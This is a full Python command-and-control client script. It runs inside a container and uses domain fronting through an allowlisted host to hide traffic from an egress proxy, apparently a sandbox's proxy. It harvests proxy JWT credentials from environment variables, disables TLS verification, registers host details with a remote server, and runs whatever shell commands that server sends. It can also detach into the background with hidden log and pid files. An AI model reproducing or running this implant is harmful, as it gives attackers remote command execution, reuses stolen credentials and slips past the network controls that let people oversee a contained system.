#!/usr/bin/env python3
"""
HTTP C2 — CLIENT
=================
Runs inside the container. Connects to the C2 server via domain fronting —
the egress proxy sees encrypted JSON POSTs to an allowlisted host.

Usage:
  python3 http_c2_client.py --key "your-preshared-key"
  python3 http_c2_client.py --key "yourkey" --front github.com --sni claude.nightrad.io
  python3 http_c2_client.py --key "yourkey" --interval 1 --sni claude.nightrad.io

Flags:
  --key       pre-shared encryption key (must match server)
  --front     CONNECT target on proxy allowlist  (default: crates.io)
  --sni       TLS SNI / C2 server hostname       (default: claude.nightrad.io)
  --interval  poll interval in seconds           (default: 1)
  --proxy     proxy host:port  (auto-detected from HTTPS_PROXY env)
"""

import argparse
import base64
import hashlib
import json
import os
import platform
import re
import socket
import ssl
import subprocess
import sys
import time
import uuid

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ── ANSI ─────────────────────────────────────────────────────────────────────
R="\033[0m"; BOLD="\033[1m"; DIM="\033[2m"
G="\033[92m"; RED="\033[91m"; CY="\033[96m"; YL="\033[93m"; MG="\033[95m"

BANNER = f"""
{BOLD}{MG}╔══════════════════════════════════════════════╗
║   HTTP C2 CLIENT                             ║
║   Encrypted JSON · Short-Poll · Domain Front ║
╚══════════════════════════════════════════════╝{R}
"""

# ── Crypto ────────────────────────────────────────────────────────────────────
def derive_key(psk: str) -> bytes:
    return hashlib.sha256(psk.encode()).digest()

def encrypt(key: bytes, plaintext: bytes) -> str:
    nonce = os.urandom(12)
    ct    = AESGCM(key).encrypt(nonce, plaintext, None)
    return base64.b64encode(nonce + ct).decode()

def decrypt(key: bytes, b64: str) -> bytes:
    raw   = base64.b64decode(b64)
    nonce = raw[:12]
    ct    = raw[12:]
    return AESGCM(key).decrypt(nonce, ct, None)

# ── Proxy credential discovery ────────────────────────────────────────────────
def discover_jwt():
    pattern = re.compile(r"https?://([^:@]+):(jwt_eyJ[^@]+)@([^:]+):(\d+)", re.I)
    for var in ["HTTPS_PROXY","HTTP_PROXY","https_proxy","http_proxy",
                "GLOBAL_AGENT_HTTPS_PROXY","GLOBAL_AGENT_HTTP_PROXY"]:
        m = pattern.search(os.environ.get(var, ""))
        if m:
            return m.group(1), m.group(2)[4:], m.group(3), int(m.group(4))
    return None

# ── Fronted HTTP connection ───────────────────────────────────────────────────
class FrontedSession:
    """
    Manages a single HTTPS request over a domain-fronted tunnel.
    Each request opens a fresh CONNECT tunnel (keeps it stateless / proxy-friendly).
    """
    def __init__(self, proxy_ip, proxy_port, proxy_user, proxy_token,
                 front_host, sni_host, timeout=15):
        self.proxy_ip    = proxy_ip
        self.proxy_port  = proxy_port
        self.proxy_user  = proxy_user
        self.proxy_token = proxy_token
        self.front_host  = front_host
        self.sni_host    = sni_host
        self.timeout     = timeout

    def _open_tunnel(self):
        import base64 as _b64
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE

        if self.proxy_ip and self.proxy_token:
            # Domain-fronted path via authenticated proxy
            auth = _b64.b64encode(
                f"{self.proxy_user}:jwt_{self.proxy_token}".encode()
            ).decode()
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(self.timeout)
            raw.connect((self.proxy_ip, self.proxy_port))
            raw.sendall((
                f"CONNECT {self.front_host}:443 HTTP/1.1\r\n"
                f"Host: {self.front_host}:443\r\n"
                f"Proxy-Authorization: Basic {auth}\r\n\r\n"
            ).encode())
            resp = b""
            while b"\r\n\r\n" not in resp:
                c = raw.recv(1024)
                if not c: break
                resp += c
            status = resp.decode("utf-8", errors="replace").splitlines()[0]
            if "200" not in status:
                raw.close()
                raise ConnectionError(f"Proxy rejected CONNECT: {status}")
            return ctx.wrap_socket(raw, server_hostname=self.sni_host)
        else:
            # No proxy token — connect directly to SNI host on port 443
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(self.timeout)
            raw.connect((self.sni_host, 443))
            return ctx.wrap_socket(raw, server_hostname=self.sni_host)

    def _read_response(self, tls):
        tls.settimeout(self.timeout)
        chunks = []
        while True:
            try:
                c = tls.recv(8192)
                if not c: break
                chunks.append(c)
                if len(b"".join(chunks)) > 1_048_576: break
            except socket.timeout: break
        raw = b"".join(chunks).decode("utf-8", errors="replace")
        if "\r\n\r\n" in raw:
            head, _, body = raw.partition("\r\n\r\n")
        else:
            head, body = raw, ""
        lines  = head.split("\r\n")
        status = int(lines[0].split()[1]) if lines and len(lines[0].split()) > 1 else 0
        return status, body

    def get(self, path: str, headers: dict = None) -> tuple[int, str]:
        tls = self._open_tunnel()
        try:
            hdrs = headers or {}
            hdr_lines = "".join(f"{k}: {v}\r\n" for k, v in hdrs.items())
            req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {self.sni_host}\r\n"
                f"User-Agent: Mozilla/5.0 (compatible; app/1.0)\r\n"
                f"Accept: application/json\r\n"
                f"{hdr_lines}"
                f"Connection: close\r\n\r\n"
            ).encode()
            tls.sendall(req)
            return self._read_response(tls)
        finally:
            try: tls.close()
            except Exception: pass

    def post(self, path: str, body: dict, headers: dict = None) -> tuple[int, str]:
        tls = self._open_tunnel()
        try:
            payload = json.dumps(body).encode()
            hdrs    = headers or {}
            hdr_lines = "".join(f"{k}: {v}\r\n" for k, v in hdrs.items())
            req = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {self.sni_host}\r\n"
                f"User-Agent: Mozilla/5.0 (compatible; app/1.0)\r\n"
                f"Accept: application/json\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(payload)}\r\n"
                f"{hdr_lines}"
                f"Connection: close\r\n\r\n"
            ).encode() + payload
            tls.sendall(req)
            return self._read_response(tls)
        finally:
            try: tls.close()
            except Exception: pass


# ── Agent logic ───────────────────────────────────────────────────────────────
class Agent:
    def __init__(self, session: FrontedSession, aes_key: bytes, interval: int):
        self.session  = session
        self.key      = aes_key
        self.interval = interval
        self.token    = None
        self.agent_id = uuid.uuid4().hex[:8]

    def _enc_post(self, path: str, obj: dict, authed=False) -> dict | None:
        payload = {"data": encrypt(self.key, json.dumps(obj).encode()),
                   "ts": int(time.time())}
        hdrs = {"Authorization": f"Bearer {self.token}"} if authed else {}
        try:
            status, body = self.session.post(path, payload, headers=hdrs)
        except Exception as e:
            print(f"  {RED}POST {path} error: {e}{R}")
            return None
        if status == 0:
            print(f"  {RED}No response from server{R}")
            return None
        try:
            resp = json.loads(body)
            if "data" in resp:
                return json.loads(decrypt(self.key, resp["data"]))
            return resp
        except Exception as e:
            print(f"  {RED}Response parse error: {e}  body={body[:80]}{R}")
            return None

    def _enc_get(self, path: str) -> dict | None:
        hdrs = {"Authorization": f"Bearer {self.token}"}
        try:
            status, body = self.session.get(path, headers=hdrs)
        except Exception as e:
            print(f"  {RED}GET {path} error: {e}{R}")
            return None
        if status == 0:
            return None
        try:
            resp = json.loads(body)
            if "data" in resp:
                return json.loads(decrypt(self.key, resp["data"]))
            return resp
        except Exception as e:
            print(f"  {RED}Response parse error: {e}  body={body[:80]}{R}")
            return None

    def register(self) -> bool:
        print(f"  {CY}Registering with C2 server...{R}")
        meta = {
            "agent_id": self.agent_id,
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "user":     os.environ.get("USER", os.environ.get("LOGNAME", "root")),
            "pid":      os.getpid(),
            "front":    self.session.front_host,
            "sni":      self.session.sni_host,
        }
        resp = self._enc_post("/api/v1/agent/register", meta)
        if resp and "token" in resp:
            self.token = resp["token"]
            print(f"  {G}Registered{R}  agent_id={self.agent_id}  "
                  f"token={self.token[:8]}...")
            return True
        print(f"  {RED}Registration failed: {resp}{R}")
        return False

    def execute(self, cmd: str) -> dict:
        t0 = time.time()
        try:
            proc = subprocess.run(
                cmd, shell=True, executable="/bin/bash",
                capture_output=True, timeout=30,
            )
            stdout  = proc.stdout.decode("utf-8", errors="replace")
            stderr  = proc.stderr.decode("utf-8", errors="replace")
            retcode = proc.returncode
        except subprocess.TimeoutExpired:
            stdout, stderr, retcode = "", "[client] command timed out\n", -1
        except Exception as e:
            stdout, stderr, retcode = "", f"[client] error: {e}\n", -2
        return {
            "stdout":  stdout,
            "stderr":  stderr,
            "retcode": retcode,
            "elapsed": round(time.time() - t0, 3),
        }

    def poll_and_run(self) -> bool:
        """Check for a pending task, run it, post result. Returns True if a task ran."""
        resp = self._enc_get("/api/v1/tasks/pending")
        if not resp:
            return False
        task_id = resp.get("task_id")
        cmd     = resp.get("cmd")
        if not task_id or not cmd:
            return False  # nothing pending

        print(f"  {MG}Task{R} [{task_id}] $ {BOLD}{cmd}{R}")
        result = self.execute(cmd)

        out_preview = result["stdout"].strip().splitlines()
        preview = out_preview[0][:50] if out_preview else "(no output)"
        print(f"  {DIM}→ exit={result['retcode']}  {preview}{R}")

        self._enc_post("/api/v1/tasks/result",
                       {"task_id": task_id, **result},
                       authed=True)
        return True

    def run(self):
        """Main polling loop with auto-reconnect on failure."""
        print(f"\n  {G}Agent running{R}  interval={self.interval}s  "
              f"front={self.session.front_host} → sni={self.session.sni_host}")
        print(f"  {DIM}Polling for tasks... Ctrl-C to stop{R}\n")

        consecutive_errors = 0
        reconnect_attempt  = 0

        while True:
            try:
                ran = self.poll_and_run()
                consecutive_errors = 0
                reconnect_attempt  = 0
                if not ran:
                    time.sleep(self.interval)

            except KeyboardInterrupt:
                print(f"\n  {YL}Stopped{R}")
                break

            except Exception as e:
                consecutive_errors += 1
                backoff = min(60, self.interval * (2 ** min(consecutive_errors, 5)))
                print(f"  {YL}Error (#{consecutive_errors}): {e}  backoff={backoff}s{R}")
                time.sleep(backoff)

                # After 3 consecutive errors, attempt re-registration
                if consecutive_errors >= 3:
                    reconnect_attempt += 1
                    print(f"  {YL}Re-registering (attempt #{reconnect_attempt})...{R}")
                    self.token = None
                    try:
                        ok = self.register()
                        if ok:
                            print(f"  {G}Re-registered{R}  token={self.token[:8]}...")
                            consecutive_errors = 0
                        else:
                            print(f"  {RED}Re-registration failed, will retry{R}")
                    except Exception as re:
                        print(f"  {RED}Re-registration error: {re}{R}")


# ── CLI ───────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="HTTP C2 client",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--key",default="your-secret",
                        help="pre-shared encryption key (must match server --key)")
    parser.add_argument("--front",    default="crates.io",
                        help="CONNECT target (must be on proxy allowlist)")
    parser.add_argument("--sni",      default="claude.nightrad.io",
                        help="C2 server hostname (SNI + HTTP Host)")
    parser.add_argument("--interval", type=float, default=1.0,
                        help="poll interval in seconds (default: 1.0)")
    parser.add_argument("--proxy",    default=None,
                        help="proxy host:port  (auto-detected from env)")
    parser.add_argument("--daemonize", "-d", action="store_true",
                        help="fork into background, log to --logfile")
    parser.add_argument("--logfile",  default="/tmp/.c2client.log",
                        help="log file when daemonized (default: /tmp/.c2client.log)")
    parser.add_argument("--pidfile",  default="/tmp/.c2client.pid",
                        help="PID file when daemonized (default: /tmp/.c2client.pid)")
    args = parser.parse_args()

    if args.daemonize:
        # Double-fork to fully detach from terminal
        pid = os.fork()
        if pid > 0:
            # First parent — write PID of grandchild after second fork
            # wait briefly for grandchild PID to appear in pidfile
            import time as _t
            for _ in range(20):
                _t.sleep(0.1)
                if os.path.exists(args.pidfile):
                    with open(args.pidfile) as f:
                        gpid = f.read().strip()
                    print(f"  {G}Daemonized{R}  PID={gpid}  log={args.logfile}")
                    print(f"  {DIM}Stop with: kill {gpid}{R}")
                    break
            sys.exit(0)

        # First child — new session, second fork
        os.setsid()
        pid2 = os.fork()
        if pid2 > 0:
            sys.exit(0)

        # Grandchild — write pidfile, redirect stdio to logfile
        with open(args.pidfile, "w") as f:
            f.write(str(os.getpid()))

        log_fd = open(args.logfile, "a", buffering=1)
        os.dup2(log_fd.fileno(), sys.stdout.fileno())
        os.dup2(log_fd.fileno(), sys.stderr.fileno())
        # Close stdin
        with open(os.devnull) as dn:
            os.dup2(dn.fileno(), sys.stdin.fileno())

    print(BANNER)

    # Resolve proxy credentials (optional — fall back to direct if unavailable)
    creds = discover_jwt()
    if creds:
        proxy_user, proxy_token, proxy_ip, proxy_port = creds
        print(f"  {DIM}JWT credentials auto-detected from environment{R}")
    else:
        proxy_user = proxy_token = proxy_ip = None
        proxy_port = 0
        print(f"  {YL}No JWT proxy detected — connecting directly{R}")
    if args.proxy:
        proxy_ip, proxy_port = args.proxy.rsplit(":", 1)
        proxy_port = int(proxy_port)

    if proxy_ip:
        print(f"  Proxy   : {proxy_ip}:{proxy_port}")
    else:
        print(f"  Proxy   : (none — direct connection)")
    print(f"  Front   : {args.front}  →  SNI: {args.sni}")

    aes_key = derive_key(args.key)
    print(f"  AES key : sha256({args.key!r}) = {aes_key.hex()[:16]}...")

    session = FrontedSession(
        proxy_ip    = proxy_ip,
        proxy_port  = proxy_port,
        proxy_user  = proxy_user,
        proxy_token = proxy_token,
        front_host  = args.front,
        sni_host    = args.sni,
        timeout     = 15,
    )

    agent = Agent(session, aes_key, args.interval)

    if not agent.register():
        sys.exit(1)

    agent.run()


if __name__ == "__main__":
    main()
